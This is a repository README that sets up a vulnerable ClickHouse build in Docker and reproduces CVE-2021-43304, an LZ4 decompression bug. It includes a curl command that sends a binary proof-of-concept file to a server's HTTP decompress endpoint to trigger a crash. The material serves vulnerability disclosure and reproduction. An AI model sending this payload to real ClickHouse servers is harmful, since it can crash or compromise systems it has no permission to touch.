# Clickhouse LZ4 RCE

The 7 vulnerabilities in Clickhouse discovered by the JFrog Security team, including 2 RCE vulnerabilities, were disclosed. For details, see: [Clickhouse Security Changelog](https://github.com/ClickHouse/ClickHouse/blob/master/docs/en/whats-new/security-changelog.md). This repository contains a reproduction environment and PoC for one of these vulnerabilities, CVE-2021-43304.

# Reproduction

First, clone this repository:

```
$ git clone https://github.com/s3nt3/clickhouse-lz4-rce.git
$ cd clickhouse-lz4-rce
```

We need to build the vulnerable clickhouse image and run the clickhouse container as follows:

```
$ cd docker && docker-compose build && docker-compose up
```

Use the following command to reproduce the crash:

```
$ cat poc/CVE-2021-43304.bin | curl -sS --data-binary @- 'http://[your ip address]:8123/?decompress=1'
```
